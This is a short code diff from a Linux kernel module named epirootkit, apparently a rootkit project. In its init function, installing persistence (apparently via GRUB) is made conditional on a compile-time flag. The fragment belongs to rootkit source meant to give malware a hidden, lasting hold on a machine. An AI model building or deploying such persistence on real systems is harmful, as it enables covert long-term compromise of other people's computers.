@@ -30,7 +30,7 @@ static int __init epirootkit_init(void) {
         return -FAILURE;
     }
 
-    if (persist() != SUCCESS) {
+    if (GRUB_PERSIST && persist() != SUCCESS) {
         ERR_MSG("epirootkit_init: persistence failed to install\n");
     }
 
